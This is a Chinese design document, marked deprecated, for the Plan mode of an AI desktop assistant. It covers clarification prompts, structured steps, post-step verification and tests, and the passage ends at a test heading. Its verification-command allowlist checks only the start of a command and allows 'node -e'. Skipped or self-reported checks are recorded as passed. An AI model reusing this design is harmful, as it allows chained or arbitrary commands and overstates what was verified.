# SpaceAssistant Plan 模式优化技术方案

> **状态：已废弃 — 见 [remove-plan-mode-requirement.md](../requirement/remove-plan-mode-requirement.md)**

> 版本：v2.2
> 设计日期：2026-05-25
> 状态：草案
> 基于：`docs/analysis/plan_mode_vs_superpowers_analysis.md` 分析结论 + `docs/review/plan_mode_optimization_review.md` 评审意见（P0/P1 已纳入，P2 记录为未来方向）
> 变更：v2.2 补充第 10 章「自动化测试方案与计划」

---

## 0. 设计总纲

### 0.1 核心原则

1. **Plan 模式适配通用桌面助手定位，不偏向开发任务。**
2. **用最小的代码增量解决最真实的用户问题。** 目标：~350 行新增代码解决 80% 短板。
3. **澄清是 Coordinator 的行为约束，不是独立的编排阶段。** 多轮澄清通过消息历史自然流转，不引入新状态机。
4. **不引入当前模型能力已覆盖的机制。** 上下文窗口充足时不策展，单 API Key 场景不做分级调度。

### 0.2 做什么、不做什么

| 做什么 | 不做什么（及原因） |
|--------|-------------------|
| 在 Coordinator 提示词中嵌入澄清指令，通过 XML 标记识别澄清/总结 | 新增独立的澄清编排阶段（增加状态机复杂度） |
| 步骤增加目标/产出/验证方式字段 | 7 种任务分类 + 6 套模板（3 套重复，维护负担） |
| 3 种步骤验证类型：命令/文件检查/自我报告 | 设计方案与执行计划分离（通用场景双审批过于繁琐） |
| 计划自审从 1 维扩展到 4 维 | 上下文策展（200K 窗口足够，截断反而引入风险） |
| 计划模板增加"候选方案"可选章节 | 模型分级调度（单 API Key 场景无意义） |
| 简单任务快速通道（跳过澄清和方案探索） | 完成流程 4 选项（过度形式化） |
| 验证失败标记 warning 而非 failed（不阻塞执行流） | — |

### 0.3 不变更的部分

以下能力不做变更：

- IPC 层工具 ACL（`planModeAcl.ts`）
- 审批闸门机制
- JSON 数据库状态持久化
- 中断恢复机制
- 计划版本管理
- UI 集成（React + Ant Design 嵌入式审批卡片）
- 环境快照

### 0.4 目标流程

```
用户输入需求（Plan 模式）
  → Coordinator（含澄清 + 方案探索指令）
    → 简单任务（≤3 步、纯信息整理）：快速通道，直接生成计划
    → 复杂任务：只读探索 → 按需提问（<clarification-question>）→ 理解确认（<clarification-summary>）→ 可选多方案 → 生成 <plan-doc>
  → 计划自审（4 维检查）
  → 审批闸门（含自审结果展示）
  → Worker 顺序执行
    → 执行当前步骤
    → 执行验证（命令/文件检查/自我报告），失败标记 warning 不阻塞
    → 记录证据（details ≤ 2000 字符）
  → 完成
```

与当前 2 步流程（Coordinator → Worker）相比，核心变化是：
- Coordinator 变得"更聪明"（会提问、会对比方案）
- Worker 变得"更可靠"（执行后必须验证）
- 中间增加了程序化自审（不增加 AI 调用）
- 验证失败不阻塞流程（warning 而非 failed）

### 0.5 简单任务判定标准

Coordinator 在以下条件**全部满足**时跳过澄清和方案探索，直接出计划：

1. 步骤数 ≤ 3
2. 不涉及文件写入或命令执行（纯信息整理/文本生成类任务）
3. 需求描述包含具体约束（对象、格式、范围明确）

典型示例："写一封请假邮件，明天请年假一天，给张经理"、"列出本周待办事项"。

---

## 1. 类型变更

### 1.1 PlanStepStatus 扩展

```typescript
// src/shared/planTypes.ts —— 在现有基础上扩展

export type PlanStepStatus = 'completed' | 'failed' | 'blocked' | 'warning'
// warning：步骤执行完成但验证未通过，不阻塞后续步骤，UI 显示警告标记
```

### 1.2 新增类型

```typescript
// === src/shared/planTypes.ts 新增 ===

/** 文件检查类型 */
export type FileCheckItem =
  | { type: 'exists' }
  | { type: 'contains'; pattern: string }
  | { type: 'size_min'; bytes: number }

/** 步骤验证方式 */
export type PlanStepVerification =
  | { kind: 'command'; command: string; expectedOutput: string }
  | { kind: 'file_check'; expectedFiles: string[]; checks: FileCheckItem[] }
  | { kind: 'self_report'; questions: string[] }

/** 增强的步骤定义（从计划文档中解析） */
export interface PlanStepDetail {
  stepIndex: number
  goal: string
  expectedOutput: string
  verificationMethod: PlanStepVerification
  dependsOn?: number[]
}

/** 步骤执行证据（details 上限 2000 字符，超长截断） */
export interface PlanStepEvidence {
  stepIndex: number
  verificationMethod: PlanStepVerification
  passed: boolean
  details: string
  timestamp: number
}

/** 计划完成后 30 天清理历史证据 */
export const EVIDENCE_RETENTION_DAYS = 30
```

### 1.3 扩展现有类型

```typescript
// PlanStepResult 增加 evidence 字段
export interface PlanStepResult {
  stepIndex: number
  status: PlanStepStatus
  summary: string
  filesModified: string[]
  errors?: string[]
  evidence?: PlanStepEvidence  // 新增
}

// PlanApprovalSummary 增加自审维度
export interface PlanApprovalSummary {
  title: string
  goalSummary: string
  stepCount: number
  fileHintCount: number
  acceptanceCriteria: string[]
  risks: string[]
  placeholderWarnings: string[]
  // 以下为新增
  consistencyIssues: string[]
  scopeWarnings: string[]
  ambiguityWarnings: string[]
}
```

### 1.4 兼容性处理

`getPlanStepResults` 的 status 验证需增加 `warning`：

```typescript
// planTypes.ts getPlanStepResults 中：
if (status !== 'completed' && status !== 'failed' && status !== 'blocked' && status !== 'warning') continue
```

---

## 2. Coordinator 增强（澄清 + 方案探索）

### 2.1 设计策略

**不新增独立的澄清编排阶段。** 澄清是 Coordinator 提示词中的行为约束。多轮澄清通过消息历史自然流转：

1. Coordinator 输出 `<clarification-question>` → 内容作为普通消息返回给用户
2. 用户回复 → 下一次 `runPlanningPhase` 调用时，消息历史包含问答上下文
3. Coordinator 继续提问或输出 `<clarification-summary>` 确认理解 → 然后输出 `<plan-doc>`

无需新增状态机，现有 `runPlanningPhase` 循环自然支持。

### 2.2 Clarification 标记解析

在 `planDocExtract.ts` 中增加两种标记：

```typescript
// electron/plan/planDocExtract.ts

const CLARIFICATION_QUESTION_RE = /<clarification-question>([\s\S]*?)<\/clarification-question>/i
const CLARIFICATION_SUMMARY_RE = /<clarification-summary>([\s\S]*?)<\/clarification-summary>/i

export type PlanDocExtractResult =
  | { kind: 'plan-doc'; content: string }
  | { kind: 'plan-abort'; content: string }
  | { kind: 'clarification-question'; content: string }  // 新增：Coordinator 在提问
  | { kind: 'clarification-summary'; content: string }   // 新增：Coordinator 确认理解
  | { kind: 'none' }
```

**解析顺序**：`plan-abort` → `plan-doc` → `clarification-question` → `clarification-summary` → fallback 检测 → `none`

### 2.3 runPlanningPhase 中的处理

```typescript
// electron/plan/planOrchestrator.ts runPlanningPhase 中

const marker = extractPlanMarkersFromAssistantContent(content)

if (marker.kind === 'plan-abort') {
  // 现有逻辑不变
}

if (marker.kind === 'plan-doc') {
  // 现有逻辑不变
}

if (marker.kind === 'clarification-question' || marker.kind === 'clarification-summary') {
  // 不改变流程——内容已返回给用户，等待用户回复后下一轮 runPlanningPhase 继续
  // marker.kind 供 UI 层判断是否显示"请回答 Coordinator 的提问"提示
  emitPlanStateChanged(args.sender, args.sessionId)
  return { ok: true, content, stopReason: res.stopReason }
}

// kind === 'none'：现有逻辑不变（fallback 检测）
```

**关键点**：澄清标记不改变编排流程。Coordinator 的提问就是普通消息，用户像正常聊天一样回复即可，无需等待"澄清完成"状态。

### 2.4 增强的 Coordinator 提示词

在现有 `PLAN_COORDINATOR_RULES` 末尾追加三段指令：

```typescript
// electron/plan/planPrompts.ts

const CLARIFICATION_RULES = [
  '',
  '【需求澄清（按需使用）】',
  '在以下情况，你必须先向用户提问再生成计划：',
  '- 用户描述过于简短，无法确定具体目标（如"帮我优化一下"）',
  '- 存在多种合理的理解方式，需要用户明确',
  '- 缺少必要的约束信息（如时间、范围、格式要求）',
  '',
  '提问规则：',
  '- 一次只问一个问题，将问题放在 <clarification-question>…</clarification-question> 标签内',
  '- 标签外不得有其他内容',
  '- 当你认为信息已充分，在 <plan-doc> 之前输出 <clarification-summary>…</clarification-summary>，',
  '  内含简短的理解摘要（2-3 句话），让用户确认你的理解是否正确',
  '- 满足以下**全部**条件时跳过提问，直接进入探索和计划生成：',
  '  1. 步骤数预计 ≤ 3',
  '  2. 不涉及文件写入或命令执行',
  '  3. 需求包含具体约束（对象、格式、范围明确）',
].join('\n')

const APPROACH_RULES = [
  '',
  '【多方案探索（按需使用）】',
  '对于存在多种可行路径的任务，在「## 3. 推荐方案」章节中：',
  '- 简要列出 2-3 个候选方案（每个方案 2-3 句话：思路 + 适用场景）',
  '- 明确推荐其中一个并说明理由',
  '',
  '以下情况不需要多方案：',
  '- 任务只有一种合理的执行方式',
  '- 简单任务（步骤 ≤ 3）',
].join('\n')

const STEP_FORMAT_RULES = [
  '',
  '【步骤格式（增强）】',
  '每个执行步骤必须包含以下信息：',
  '',
  '- [ ] **步骤 N：<标题>**',
  '  - 目标：<本步骤要达成什么>',
  '  - 产出：<具体交付物>',
  '  - 验证：<command: 命令> 或 <file_check: 文件路径 + 检查项> 或 <self_report: 自我检查问题>',
  '',
  '验证方式说明：',
  '- command：可自动执行的验证命令（如 `npm test`、`ls 文件路径`）',
  '- file_check：检查指定文件是否存在或包含预期内容（格式：文件路径 | exists | contains:关键字 | size_min:字节数）',
  '- self_report：无法自动验证时，Worker 自我检查的问题',
].join('\n')
```

---

## 3. 步骤内容增强

### 3.1 增强的步骤解析

在 `planParser.ts` 中新增 `extractEnhancedSteps`：

```typescript
/** 从增强格式的计划文档中解析步骤详情，解析失败时降级为简单步骤 */
export function extractEnhancedSteps(body: string, rawSteps: string[]): PlanStepDetail[] {
  const section = extractSection(body, '4. 执行步骤') || extractSection(body, '执行步骤')
  if (!section) return rawSteps.map((_, i) => fallbackStep(i, rawSteps[i]!))

  const steps: PlanStepDetail[] = []
  // 按 "**步骤 N：标题**" 分割（兼容有无 ** 包裹、中英文冒号）
  const stepRegex = /(?:^|\n)\*{0,2}\s*步骤\s*(\d+)[：:]\s*(.+?)\*{0,2}\s*(?=\n|$)/g
  const parts = splitByRegex(section, stepRegex)

  for (const part of parts) {
    const detail = parseStepDetail(part)
    steps.push(detail ?? fallbackStep(steps.length, part.rawText))
  }

  return steps
}

function fallbackStep(index: number, rawText: string): PlanStepDetail {
  return {
    stepIndex: index,
    goal: rawText.slice(0, 200),
    expectedOutput: '见步骤描述',
    verificationMethod: { kind: 'self_report', questions: ['本步骤是否已完成？'] }
  }
}

/** 从步骤文本中提取增强字段 */
function parseStepDetail(block: string): PlanStepDetail | null {
  const goalMatch = /-\s*目标[：:]\s*(.+)/i.exec(block)
  const outputMatch = /-\s*产出[：:]\s*(.+)/i.exec(block)
  const verifyMatch = /-\s*验证[：:]\s*(.+)/i.exec(block)

  if (!goalMatch && !verifyMatch) return null  // 无增强字段，降级

  return {
    stepIndex: 0,  // 由调用方按位置赋值
    goal: goalMatch?.[1]?.trim() ?? block.slice(0, 200),
    expectedOutput: outputMatch?.[1]?.trim() ?? '见步骤描述',
    verificationMethod: parseVerificationField(verifyMatch?.[1]?.trim() ?? '')
  }
}

/** 解析验证字段 */
function parseVerificationField(raw: string): PlanStepVerification {
  if (/^command\s*[：:]/i.test(raw)) {
    const inner = raw.replace(/^command\s*[：:]\s*/i, '').trim()
    // 格式：命令 | 期望输出
    const parts = inner.split(/\s*\|\s*/)
    return { kind: 'command', command: parts[0] ?? inner, expectedOutput: parts[1] ?? '' }
  }
  if (/^file_check\s*[：:]/i.test(raw)) {
    const inner = raw.replace(/^file_check\s*[：:]\s*/i, '').trim()
    // 格式：文件路径 | exists | contains:关键字 | size_min:字节数
    const parts = inner.split(/\s*\|\s*/).map(s => s.trim())
    const expectedFiles = [parts[0] ?? inner]
    const checks: FileCheckItem[] = []
    for (const item of parts.slice(1)) {
      if (item === 'exists') checks.push({ type: 'exists' })
      else if (item.startsWith('contains:')) checks.push({ type: 'contains', pattern: item.slice(9) })
      else if (item.startsWith('size_min:')) checks.push({ type: 'size_min', bytes: Number(item.slice(9)) || 0 })
    }
    return { kind: 'file_check', expectedFiles, checks: checks.length > 0 ? checks : [{ type: 'exists' }] }
  }
  // 默认 self_report
  return { kind: 'self_report', questions: [raw || '本步骤是否已完成？'] }
}
```

### 3.2 Worker 提示词增强

```typescript
export function buildPlanWorkerSystemPrompt(args: {
  planTitle: string
  stepIndex: number
  stepsTotal: number
  stepText: string
  stepDetail: PlanStepDetail | null  // 新增
}): string {
  const lines = [
    '你处于 SpaceAssistant Plan Mode 执行期（Worker）。',
    `计划：${args.planTitle}`,
    `当前步骤 ${args.stepIndex + 1}/${args.stepsTotal}：${args.stepText}`,
  ]

  if (args.stepDetail) {
    lines.push(
      '',
      `步骤目标：${args.stepDetail.goal}`,
      `预期产出：${args.stepDetail.expectedOutput}`,
      `验证方式：${describeVerification(args.stepDetail.verificationMethod)}`,
    )
  }

  lines.push(
    '',
    '【规则】',
    '- 仅完成当前步骤，不得超出范围',
    '- 完成后，按验证方式提供证据（如指定了命令，请执行并报告输出）',
    '- 若阻塞且无法恢复，说明阻塞原因'
  )

  return lines.join('\n')
}
```

---

## 4. 执行后验证

### 4.1 验证实现

在 `planOrchestrator.ts` 的 `runWorkerExecution` 中，Worker 执行完成后、标记步骤状态前插入验证：

```typescript
// 现有：Worker 执行完成，得到 summary
// 新增：解析增强步骤 → 执行验证 → 根据验证结果决定 status

const details = extractEnhancedSteps(planBody, steps)
const stepDetail = details[stepIndex]

const evidence = await performStepVerification({
  verification: stepDetail?.verificationMethod,
  workDir,
  stepIndex,
})

// 验证未通过 → warning，不阻塞后续步骤
const stepStatus: PlanStepStatus = evidence.passed ? 'completed' : 'warning'

const stepResult: PlanStepResult = {
  stepIndex,
  status: stepStatus,
  summary,
  filesModified: [],
  evidence
}
```

### 4.2 验证函数

```typescript
async function performStepVerification(args: {
  verification?: PlanStepVerification
  workDir: string
  stepIndex: number
}): Promise<PlanStepEvidence> {
  const v = args.verification ?? {
    kind: 'self_report',
    questions: ['步骤是否已完成？']
  }

  switch (v.kind) {
    case 'command': {
      if (!isSafeVerificationCommand(v.command)) {
        return {
          stepIndex: args.stepIndex,
          verificationMethod: v,
          passed: true,  // 非白名单命令不阻塞，降级为信任 Worker
          details: `命令 \`${v.command}\` 不在安全白名单中，跳过自动验证`,
          timestamp: Date.now()
        }
      }
      // 最多重试 1 次（应对临时性错误）
      for (let retry = 0; retry < 2; retry++) {
        try {
          const output = await execCommand(v.command, args.workDir, { timeout: 30000 })
          const passed = output.includes(v.expectedOutput)
          return {
            stepIndex: args.stepIndex,
            verificationMethod: v,
            passed,
            details: output.slice(0, 2000),  // 上限 2000 字符
            timestamp: Date.now()
          }
        } catch (err) {
          if (retry === 0) continue  // 重试一次
          return {
            stepIndex: args.stepIndex,
            verificationMethod: v,
            passed: false,
            details: `命令执行失败（已重试）: ${String(err).slice(0, 1800)}`,
            timestamp: Date.now()
          }
        }
      }
    }

    case 'file_check': {
      const results: string[] = []
      let allPassed = true
      for (const f of v.expectedFiles) {
        const fullPath = path.resolve(args.workDir, f)
        const exists = await fileExists(fullPath)
        if (!exists) {
          results.push(`${f}: 不存在`)
          allPassed = false
          continue
        }
        // 执行具体检查项
        for (const check of v.checks) {
          if (check.type === 'exists') {
            results.push(`${f}: 存在`)
          } else if (check.type === 'contains') {
            const content = await readFileContent(fullPath)
            const found = content.includes(check.pattern)
            results.push(`${f} contains "${check.pattern}": ${found ? '是' : '否'}`)
            if (!found) allPassed = false
          } else if (check.type === 'size_min') {
            const stat = await fs.stat(fullPath)
            const ok = stat.size >= check.bytes
            results.push(`${f} size >= ${check.bytes}: ${ok ? '是' : '否'} (${stat.size} bytes)`)
            if (!ok) allPassed = false
          }
        }
      }
      return {
        stepIndex: args.stepIndex,
        verificationMethod: v,
        passed: allPassed,
        details: results.join('\n').slice(0, 2000),
        timestamp: Date.now()
      }
    }

    case 'self_report': {
      return {
        stepIndex: args.stepIndex,
        verificationMethod: v,
        passed: true,  // self_report 信任 Worker
        details: '基于 Worker 自我报告（未独立验证）',
        timestamp: Date.now()
      }
    }
  }
}
```

### 4.3 验证命令安全白名单

```typescript
/** 验证命令安全白名单——可通过 AppConfig 扩展 */
const DEFAULT_SAFE_VERIFICATION_PATTERNS: RegExp[] = [
  /^npm\s+(test|run\s+test)/,
  /^npx\s+(vitest|jest|pytest|tsc\s+--noEmit)/,
  /^pytest/,
  /^ls\s/,
  /^dir\s/,
  /^cat\s/,
  /^type\s/,
  /^git\s+(status|diff|log|branch)/,
  /^node\s+-e\s/,
]

function getSafeVerificationPatterns(config?: AppConfig): RegExp[] {
  const extras = config?.safeVerificationCommands ?? []
  return [...DEFAULT_SAFE_VERIFICATION_PATTERNS, ...extras.map(p => new RegExp(p))]
}

function isSafeVerificationCommand(cmd: string, config?: AppConfig): boolean {
  const patterns = getSafeVerificationPatterns(config)
  return patterns.some(p => p.test(cmd.trim()))
}
```

白名单配置化策略：默认模式内置，用户可通过 `AppConfig.safeVerificationCommands` 追加自定义正则表达式字符串，无需 UI 改动。

---

## 5. 计划自审增强

### 5.1 自审维度

在 `planParser.ts` 的 `buildPlanApprovalSummary` 中增加三个新维度：

```typescript
export function buildPlanApprovalSummary(raw: string): PlanApprovalSummary {
  const parsed = parsePlanMarkdown(raw)
  // ... 现有逻辑 ...

  return {
    title: parsed.title,
    goalSummary,
    stepCount: parsed.steps.length || parsed.frontmatter.steps_total || 0,
    fileHintCount: countFileHints(parsed.body),
    acceptanceCriteria: listFromSection(acceptance, 3),
    risks: listFromSection(risks, 3),
    placeholderWarnings,
    // 以下为新增
    consistencyIssues: checkConsistency(parsed),
    scopeWarnings: checkScope(parsed),
    ambiguityWarnings: checkAmbiguity(parsed.body)
  }
}

// 1. 一致性检查
function checkConsistency(parsed: ParsedPlanFile): string[] {
  const issues: string[] = []
  if (parsed.frontmatter.steps_total && parsed.frontmatter.steps_total !== parsed.steps.length) {
    issues.push(`frontmatter 声明 ${parsed.frontmatter.steps_total} 步，实际解析到 ${parsed.steps.length} 步`)
  }
  return issues
}

// 2. 范围检查
function checkScope(parsed: ParsedPlanFile): string[] {
  const warnings: string[] = []
  if (parsed.steps.length > 15) {
    warnings.push(`步骤总数 ${parsed.steps.length}，超过 15 步建议拆分为多个计划`)
  }
  for (const step of parsed.steps) {
    if (step.length > 200 && !step.includes('\n')) {
      warnings.push(`步骤 "${step.slice(0, 60)}..." 描述过长，建议拆分`)
    }
  }
  return warnings
}

// 3. 歧义检查
function checkAmbiguity(body: string): string[] {
  const warnings: string[] = []
  const AMBIGUOUS_PATTERNS = [
    { re: /\b(适当|合理|根据需要|视情况|酌情)\b/, msg: '含模糊措辞' },
    { re: /\b(等|等等|之类|及其他)\b/, msg: '使用了不完整列举' },
    { re: /\b(优化|完善|改进)\b(?!.*具体)/, msg: '动词缺乏具体目标' },
  ]
  for (const line of body.split('\n')) {
    for (const { re, msg } of AMBIGUOUS_PATTERNS) {
      if (re.test(line)) {
        warnings.push(`${msg}："${line.trim().slice(0, 80)}..."`)
        break
      }
    }
  }
  return warnings.slice(0, 10)
}
```

> **未来方向（P2）**：歧义模式可通过配置文件扩展；自审警告支持用户标记"已知风险"避免重复提示。当前保持硬编码，等待用户反馈驱动。

### 5.2 审批卡片展示

在 `PlanPanelApproval` 组件中，自审结果以折叠警告列表展示：

- 无警告：显示绿色「自审通过」
- 仅有占位符警告：显示黄色「有 N 项需注意」
- 有其他警告：显示黄色「有 N 项需注意」，折叠展开后可查看详情

---

## 6. 计划模板变更

### 6.1 增强后的模板

```markdown
---
plan_id: plan-YYYYMMDD-001
status: pending
version: 1
created_at: <ISO8601>
approved_at: null
steps_total: <N>
steps_completed: 0
---

# 计划：<任务标题>

## 1. 目标
<可验收的目标描述，禁止 TODO/TBD>

## 2. 背景与现状
<与任务相关的背景信息>

## 3. 推荐方案

<复杂任务有多个可行路径时，列出候选方案；简单任务直接说明方案>

### 候选方案 A：<方案名称>
- 思路：<核心思路>
- 适用场景：<什么情况选这个>

### 候选方案 B：<方案名称>
- 思路：<核心思路>
- 适用场景：<什么情况选这个>

### 推荐
<推荐方案及理由>

## 4. 执行步骤

- [ ] **步骤 1：<标题>**
  - 目标：<本步骤要达成什么>
  - 产出：<具体交付物>
  - 验证：<command: 命令 | file_check: 文件路径 | 检查项 | self_report: 检查问题>

- [ ] **步骤 2：<标题>**
  - 目标：<本步骤要达成什么>
  - 产出：<具体交付物>
  - 验证：<command: 命令 | file_check: 文件路径 | 检查项 | self_report: 检查问题>

## 5. 关键要素
- 涉及文件：<路径列表>
- 不修改：<范围说明>

## 6. 验收标准
- [ ] <可验证的标准>

## 7. 风险与注意事项
- 风险：<描述>
- 注意：<描述>
```

核心变更：
1. `## 3. 推荐方案` 增加可选的候选方案子章节（简单任务不需要）
2. `## 4. 执行步骤` 从纯文本 checkbox 升级为含目标/产出/验证的结构化步骤

---

## 7. 文件变更清单

| 文件 | 变更类型 | 说明 |
|------|---------|------|
| `src/shared/planTypes.ts` | **扩展** | `PlanStepStatus` 增加 `warning`；新增 `FileCheckItem`、`PlanStepDetail`、`PlanStepVerification`、`PlanStepEvidence`；`PlanStepResult` 增加 `evidence`；`PlanApprovalSummary` 增加自审字段；`getPlanStepResults` 适配 `warning` 状态；`AppConfig` 增加 `safeVerificationCommands` 可选字段 |
| `electron/plan/planPrompts.ts` | **扩展** | `PLAN_COORDINATOR_RULES` 追加澄清/方案探索/步骤格式指令；`buildPlanWorkerSystemPrompt` 增加 `stepDetail` 参数 |
| `electron/plan/planParser.ts` | **扩展** | 新增 `extractEnhancedSteps`、`parseStepDetail`、`parseVerificationField`；新增自审函数（`checkConsistency`/`checkScope`/`checkAmbiguity`）；`buildPlanApprovalSummary` 返回自审结果 |
| `electron/plan/planOrchestrator.ts` | **修改** | `runPlanningPhase` 处理 `clarification-question`/`clarification-summary` 标记；`runWorkerExecution` 增加验证步骤；新增 `performStepVerification`、`isSafeVerificationCommand`、`getSafeVerificationPatterns` |
| `electron/plan/planDocExtract.ts` | **扩展** | 新增 `clarification-question`/`clarification-summary` 标记解析；`PlanDocExtractResult` 增加两种 kind |
| `electron/plan/planManager.ts` | **不变** | 现有元数据机制已支持 evidence 存储 |
| `electron/plan/planModeAcl.ts` | **不变** | 现有 ACL 机制足够 |
| `src/renderer/components/Plan/PlanPanelApproval.tsx` | **修改** | 展示自审结果警告（一致性/范围/歧义） |
| `src/renderer/components/Plan/StepVerificationView.tsx` | **新增** | 步骤验证状态展示（warning 标记 + evidence 详情） |
| `electron/plan/planTypes.test.ts` | **新增** | 类型兼容性测试（warning 状态 + 新类型校验，~6 用例） |
| `electron/plan/planPrompts.test.ts` | **新增** | 提示词生成测试（Worker stepDetail 参数，~6 用例） |
| `electron/plan/planVerification.test.ts` | **新增** | 验证逻辑 + 安全白名单测试（~14 用例） |
| `electron/plan/planOrchestrator.test.ts` | **新增** | 编排流程集成测试（澄清 + 验证，~10 用例） |
| `electron/plan/planDocExtract.test.ts` | **扩展** | 澄清标记解析（+8 用例） |
| `electron/plan/planParser.test.ts` | **扩展** | 增强步骤解析 + 自审函数（+18 用例） |
| `src/renderer/components/Plan/PlanPanelApproval.test.tsx` | **扩展** | 自审结果展示（+5 用例） |
| `src/renderer/components/Plan/StepVerificationView.test.tsx` | **新增** | 验证状态组件测试（~6 用例） |

**共 7 个源文件变更 + 2 个新源文件 + 4 个新测试文件 + 3 个扩展测试文件。** 预计新增 ~67 个测试用例，无"重写"、"重构"级别变更。

---

## 8. 实施计划

### 第一阶段（1-1.5 周）：核心功能 + 单元测试

```
Step 1: planTypes.ts 扩展类型（PlanStepStatus warning + 新类型 + getPlanStepResults 适配）
Step 1T: planTypes.test.ts 新增（类型兼容性 ~6 用例）

Step 2: planDocExtract.ts 增加 clarification-question/summary 解析
Step 2T: planDocExtract.test.ts 扩展（澄清标记 +8 用例）

Step 3: planPrompts.ts 扩展提示词（澄清 + 方案 + 步骤格式 + Worker stepDetail）
Step 3T: planPrompts.test.ts 新增（提示词生成 ~6 用例）

Step 4: planParser.ts 扩展（extractEnhancedSteps + parseVerificationField + 自审函数）
Step 4T: planParser.test.ts 扩展（增强步骤 + 自审 +18 用例）

Step 5: planOrchestrator.ts 增加澄清标记处理 + 验证逻辑（performStepVerification）
Step 5T: planVerification.test.ts 新增（验证 + 白名单 ~14 用例）
```

### 第二阶段（1 周）：UI 适配 + 组件测试

```
Step 6: PlanPanelApproval 展示自审结果（consistencyIssues/scopeWarnings/ambiguityWarnings）
Step 6T: PlanPanelApproval.test.tsx 扩展（自审展示 +5 用例）

Step 7: StepVerificationView 新增（warning 状态 + evidence 展示）
Step 7T: StepVerificationView.test.tsx 新增（验证 UI ~6 用例）
```

### 第三阶段（0.5 周）：集成测试 + 端到端验证

```
Step 8: planOrchestrator.test.ts 新增（编排流程集成 ~10 用例）
Step 9: 端到端手动验证 + 各种任务类型覆盖
```

### 不在本次范围

以下功能等待用户反馈后再决定是否实施：
- 多方案选择 UI（候选方案在计划中已描述，用户可在审批时通过反馈表达偏好）
- 步骤依赖关系可视化
- 计划完成后导出按钮
- 自审规则配置化 UI（P2）
- 自审警告"已知风险"标记机制（P2）

---

## 9. 风险与缓解

| 风险 | 缓解措施 |
|------|---------|
| **澄清阶段交互变慢** | 简单任务快速通道（Coordinator 指令中明确判定标准）；用户可像正常聊天一样回复，无需等待"澄清完成" |
| **步骤格式解析失败** | `parseStepDetail` 返回 null → 降级为 `fallbackStep()`；所有字段有默认值 |
| **验证命令安全性** | 默认安全命令白名单 + 支持用户扩展 + 非白名单命令降级为 self_report（不阻塞） |
| **验证失败阻塞流程** | 验证失败标记 `warning` 而非 `failed`，步骤继续推进，证据可追溯 |
| **向后兼容** | 旧格式计划（纯文本步骤）通过 fallbackStep 降级处理；`warning` 状态在旧 UI 中等同 `completed` 展示 |
| **Clarification 标记未闭合** | 与现有 `plan-doc`/`plan-abort` 提取逻辑一致，未闭合标记视为 `kind: 'none'`，流程继续 |
| **命令执行临时失败** | 最多重试 1 次（总计 2 次尝试），应对网络抖动等临时问题 |

---

## 10. 自动化测试方案

### 10.1 测试策略总览

| 维度 | 策略 |
|------|------|
| **测试框架** | Vitest（与项目一致），主进程 `node` 环境，渲染进程 `jsdom` 环境 |
| **测试金字塔** | 单元测试（70%）> 组件测试（20%）> 集成测试（10%） |
| **测试文件位置** | 就近放置：`electron/plan/*.test.ts`、`src/renderer/components/Plan/*.test.tsx` |
| **测试数据** | 每个测试文件内联 sample fixture，不共享可变状态 |
| **Mock 策略** | 文件系统用 `fs/promises` + tmpdir（参考 `planManager.test.ts`）；Claude API 调用通过 mock 模块隔离 |
| **覆盖率目标** | 新增代码行覆盖率 ≥ 85%，分支覆盖率 ≥ 75% |

### 10.2 测试文件清单

```
electron/plan/
├── planTypes.test.ts          # 新增：类型兼容性测试
├── planDocExtract.test.ts     # 扩展：澄清标记解析（+8 用例）
├── planParser.test.ts         # 扩展：增强步骤解析 + 自审函数（+18 用例）
├── planPrompts.test.ts        # 新增：提示词生成测试（+6 用例）
├── planVerification.test.ts   # 新增：验证逻辑 + 安全白名单（+14 用例）
├── planOrchestrator.test.ts   # 新增：编排流程集成测试（+10 用例）
├── planManager.test.ts        # 不变（现有 5 用例）
├── planModeAcl.test.ts        # 不变（现有用例）

src/renderer/components/Plan/
├── PlanPanelApproval.test.tsx  # 扩展：自审结果展示（+5 用例）
├── StepVerificationView.test.tsx  # 新增：验证状态组件（+6 用例）
└── planPanelState.test.ts     # 不变（现有 5 用例）
```

**共 4 个新测试文件 + 3 个扩展现有测试文件，预计新增 ~67 个用例。**

### 10.3 单元测试详细设计

#### 10.3.1 planTypes.test.ts（新增，~6 用例）

测试类型定义的正确性和兼容性。

```
describe('getPlanStepResults with warning status')
  - 识别 warning 状态并正确解析
  - warning 与 completed/failed/blocked 混合数组全部解析
  - 未知状态被跳过（不崩溃）
  - 空数组返回 []

describe('PlanStepEvidence')
  - 完整 evidence 对象字段校验
  - details 为空字符串时正常序列化
  - timestamp 为有效数字

describe('PlanStepVerification 类型')
  - command 类型含 command + expectedOutput
  - file_check 类型含 expectedFiles + checks
  - self_report 类型含 questions
```

#### 10.3.2 planDocExtract.test.ts（扩展，+8 用例）

在现有 5 个用例基础上新增澄清标记解析测试。

```
describe('clarification markers')
  - 提取 <clarification-question> 内容，kind 为 clarification-question
  - 提取 <clarification-summary> 内容，kind 为 clarification-summary
  - 未闭合的 <clarification-question>（缺 </clarification-question>）→ kind: none

describe('marker priority')
  - plan-abort 优先于 clarification-question
  - plan-doc 优先于 clarification-question
  - clarification-question 优先于 clarification-summary（同时存在时取先出现的）
  - 无任何已知标记 → kind: none

describe('clarification markers in mixed content')
  - clarification-summary 后紧跟 plan-doc → 取 plan-doc（优先级更高）
```

#### 10.3.3 planParser.test.ts（扩展，+18 用例）

在现有 4 个用例基础上新增增强步骤解析和自审函数测试。

```
describe('extractEnhancedSteps')
  - 解析含目标/产出/验证的完整增强步骤
  - 解析含 command 验证的步骤
  - 解析含 file_check 验证的步骤（exists + contains + size_min）
  - 解析含 self_report 验证的步骤
  - 步骤不含增强字段 → 降级为 fallbackStep（goal 截取文本，self_report 默认问题）
  - 无「执行步骤」章节 → 全部降级为 fallbackStep
  - 步骤编号不连续（如 1, 3, 5）→ 按出现顺序分配 stepIndex
  - 混合格式（部分步骤有增强字段，部分没有）→ 有则解析，无则降级

describe('parseVerificationField')
  - command: 格式 "command: npm test | all passing"
  - command: 仅有命令无期望输出 → expectedOutput 为空字符串
  - file_check: 格式 "file_check: src/a.ts | exists | contains:TODO"
  - file_check: 仅有文件路径无检查项 → 默认 exists
  - self_report: 任意非 command/file_check 前缀文本
  - 空字符串 → self_report 默认问题

describe('checkConsistency')
  - frontmatter steps_total 与实际步骤数一致 → 无警告
  - frontmatter steps_total 与实际步骤数不一致 → 返回警告
  - 无 frontmatter steps_total → 无警告

describe('checkScope')
  - 步骤数 ≤ 15 → 无警告
  - 步骤数 > 15 → 警告"建议拆分"
  - 单行步骤超过 200 字符且无换行 → 警告"描述过长"
  - 多行步骤（含 \n）即使总长 > 200 → 不触发描述过长警告

describe('checkAmbiguity')
